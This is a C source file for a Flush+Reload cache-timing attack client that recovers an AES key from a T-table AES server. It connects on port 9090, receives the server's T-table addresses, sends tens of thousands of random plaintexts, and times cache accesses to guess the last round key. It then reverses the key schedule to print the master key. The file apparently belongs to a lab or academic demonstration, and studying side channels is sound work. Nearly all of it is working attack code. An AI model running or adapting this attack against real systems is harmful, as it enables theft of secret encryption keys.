#include <netdb.h>
#include <stdio.h>
#include <string.h>
#include <sched.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "cacheutils.h"

#define PORT 9090
#define SA struct sockaddr
#define MIN_CACHE_MISS_CYCLES (205)
#define NUMBER_OF_ENCRYPTIONS (40000)

static const uint8_t sbox[256] =
    {0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
     0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
     0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
     0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,
     0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,
     0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
     0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,
     0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,
     0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
     0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,
     0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,
     0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
     0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
     0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
     0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
     0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16};

size_t sum;
size_t scount;

void communicate(int sockfd, unsigned int *plaintext, unsigned int *ciphertext)
{
    write(sockfd, plaintext, sizeof(unsigned int) * 16);

    if (plaintext[0] == -1)
        return;

    bzero(ciphertext, sizeof(unsigned int) * 16);

    read(sockfd, ciphertext, sizeof(unsigned int) * 16);
}

int bot_elems(double *arr, int N, int *bot, int n)
{
    int bot_count = 0;
    int i;
    for (i = 0; i < N; ++i)
    {
        int k;
        for (k = bot_count; k > 0 && arr[i] < arr[bot[k - 1]]; k--)
            ;
        if (k >= n)
            continue;
        int j = bot_count;
        if (j > n - 1)
            j = n - 1;
        else
            bot_count++;
        for (; j > k; j--)
            bot[j] = bot[j - 1];
        bot[k] = i;
    }
    return bot_count;
}

uint32_t subWord(uint32_t word)
{
    uint32_t retval = 0;

    uint8_t t1 = sbox[(word >> 24) & 0x000000ff];
    uint8_t t2 = sbox[(word >> 16) & 0x000000ff];
    uint8_t t3 = sbox[(word >> 8) & 0x000000ff];
    uint8_t t4 = sbox[(word)&0x000000ff];

    retval = (t1 << 24) ^ (t2 << 16) ^ (t3 << 8) ^ t4;

    return retval;
}

void flushAttack(int sockfd)
{
    int i, j, k;
    unsigned int plaintext[16];
    unsigned int ciphertext[16];
    unsigned int restoredtext[128];
    unsigned int countKeyCandidates[16][256];
    unsigned int cacheMisses[16][256];
    unsigned int totalEncs[16][256];
    double missRate[16][256];
    unsigned int lastRoundKeyGuess[16];
    unsigned int **taddress;
    taddress = malloc(sizeof(unsigned int *) * 4);

    //receiving t-table addresses from the server
    read(sockfd, taddress, sizeof(unsigned int *) * 4);

    for (i = 0; i < 16; i++)
    {
        for (j = 0; j < 256; j++)
        {
            totalEncs[i][j] = 0;
            cacheMisses[i][j] = 0;
            countKeyCandidates[i][j] = 0;
        }
    }
    uint64_t min_time = rdtsc();
    srand(min_time);
    sum = 0;
    unsigned int *probe[] = {taddress[0], taddress[1], taddress[2], taddress[3]};
    printf("\nT-table addresses recieved...\nTe0: %p\nTe1: %p\nTe2: %p\nTe3: %p\n", taddress[0], taddress[1], taddress[2], taddress[3]);

    for (k = 0; k < 4; k++)
    {
        for (i = 0; i < NUMBER_OF_ENCRYPTIONS; ++i)
        {
            for (j = 0; j < 16; ++j)
                plaintext[j] = rand() % 256;
            flush(probe[k]);

            //sending plaintext and receiving consequent ciphertext from the server
            communicate(sockfd, plaintext, ciphertext);

            /*printf("\nCiphertext recieved: ");
            for (i = 0; i < 16; i++)
                printf("%02X ", ciphertext[i]);*/

            size_t time = rdtsc();
            maccess(probe[k]);
            size_t delta = rdtsc() - time;
            int index = (k + 2) % 4;
            for (j = 0; j <= 12; j = j + 4)
                totalEncs[index + j][(int)ciphertext[index + j]]++;
            if (delta > MIN_CACHE_MISS_CYCLES)
            {
                for (j = 0; j <= 12; j = j + 4)
                    cacheMisses[index + j][(int)ciphertext[index + j]]++;
            }
        }
    }

    plaintext[0] = -1;
    communicate(sockfd, plaintext, ciphertext);

    // calculate the cache miss rates
    for (i = 0; i < 16; i++)
    {
        for (j = 0; j < 256; j++)
        {
            missRate[i][j] = (double)cacheMisses[i][j] / totalEncs[i][j];
        }
    }

    int botIndices[16][16];
    // get the values of lowest missrates
    for (i = 0; i < 16; i++)
    {
        bot_elems(missRate[i], 256, botIndices[i], 16);
    }

    for (i = 0; i < 16; i++)
    {
        // loop through ciphertext bytes with lowest missrates
        for (j = 0; j < 16; j++)
        {
            countKeyCandidates[i][botIndices[i][j] ^ 99]++;
            countKeyCandidates[i][botIndices[i][j] ^ 124]++;
            countKeyCandidates[i][botIndices[i][j] ^ 119]++;
            countKeyCandidates[i][botIndices[i][j] ^ 123]++;
            countKeyCandidates[i][botIndices[i][j] ^ 242]++;
            countKeyCandidates[i][botIndices[i][j] ^ 107]++;
            countKeyCandidates[i][botIndices[i][j] ^ 111]++;
            countKeyCandidates[i][botIndices[i][j] ^ 197]++;
            countKeyCandidates[i][botIndices[i][j] ^ 48]++;
            countKeyCandidates[i][botIndices[i][j] ^ 1]++;
            countKeyCandidates[i][botIndices[i][j] ^ 103]++;
            countKeyCandidates[i][botIndices[i][j] ^ 43]++;
            countKeyCandidates[i][botIndices[i][j] ^ 254]++;
            countKeyCandidates[i][botIndices[i][j] ^ 215]++;
            countKeyCandidates[i][botIndices[i][j] ^ 171]++;
            countKeyCandidates[i][botIndices[i][j] ^ 118]++;
        }
    }

    // find the max value in countKeyCandidate...
    // this is our guess at the key byte for that ctext position
    for (i = 0; i < 16; i++)
    {
        int maxValue = 0;
        int maxIndex;
        for (j = 0; j < 256; j++)
        {
            if (countKeyCandidates[i][j] > maxValue)
            {
                maxValue = countKeyCandidates[i][j];
                maxIndex = j;
            }
        }
        // save in the guess array
        lastRoundKeyGuess[i] = maxIndex;
    }

    // Algorithm to recover the master key from the last round key
    uint32_t roundWords[4];
    roundWords[3] = (((uint32_t)lastRoundKeyGuess[12]) << 24) ^
                    (((uint32_t)lastRoundKeyGuess[13]) << 16) ^
                    (((uint32_t)lastRoundKeyGuess[14]) << 8) ^
                    (((uint32_t)lastRoundKeyGuess[15]));

    roundWords[2] = (((uint32_t)lastRoundKeyGuess[8]) << 24) ^
                    (((uint32_t)lastRoundKeyGuess[9]) << 16) ^
                    (((uint32_t)lastRoundKeyGuess[10]) << 8) ^
                    (((uint32_t)lastRoundKeyGuess[11]));

    roundWords[1] = (((uint32_t)lastRoundKeyGuess[4]) << 24) ^
                    (((uint32_t)lastRoundKeyGuess[5]) << 16) ^
                    (((uint32_t)lastRoundKeyGuess[6]) << 8) ^
                    (((uint32_t)lastRoundKeyGuess[7]));

    roundWords[0] = (((uint32_t)lastRoundKeyGuess[0]) << 24) ^
                    (((uint32_t)lastRoundKeyGuess[1]) << 16) ^
                    (((uint32_t)lastRoundKeyGuess[2]) << 8) ^
                    (((uint32_t)lastRoundKeyGuess[3]));

    uint32_t tempWord4, tempWord3, tempWord2, tempWord1;
    uint32_t rcon[10] = {0x36000000, 0x1b000000, 0x80000000, 0x40000000,
                         0x20000000, 0x10000000, 0x08000000, 0x04000000,
                         0x02000000, 0x01000000};
    // loop to backtrack aes key expansion
    for (i = 0; i < 10; i++)
    {
        tempWord4 = roundWords[3] ^ roundWords[2];
        tempWord3 = roundWords[2] ^ roundWords[1];
        tempWord2 = roundWords[1] ^ roundWords[0];

        uint32_t rotWord = (tempWord4 << 8) ^ (tempWord4 >> 24);

        tempWord1 = (roundWords[0] ^ rcon[i] ^ subWord(rotWord));

        roundWords[3] = tempWord4;
        roundWords[2] = tempWord3;
        roundWords[1] = tempWord2;
        roundWords[0] = tempWord1;
    }
    printf("Key found from attack: ");
    for (i = 3; i >= 0; i--)
    {
        printf("%X  ", roundWords[i]);
    }
    printf("\n");

    fflush(stdout);
}

int main()
{
    int sockfd, connfd;
    struct sockaddr_in servaddr, cli;

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1)
    {
        printf("socket creation failed...\n");
        exit(0);
    }
    else
        printf("Socket successfully created...\n");

    bzero(&servaddr, sizeof(servaddr));

    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = INADDR_ANY;
    servaddr.sin_port = htons(PORT);

    if (connect(sockfd, (SA *)&servaddr, sizeof(servaddr)) < 0)
    {
        printf("connection with the server failed...\n");
        exit(0);
    }
    else
        printf("Connected to the server...\n");

    flushAttack(sockfd);

    close(sockfd);

    printf("\nClient Exit...\n");
    return 0;
}
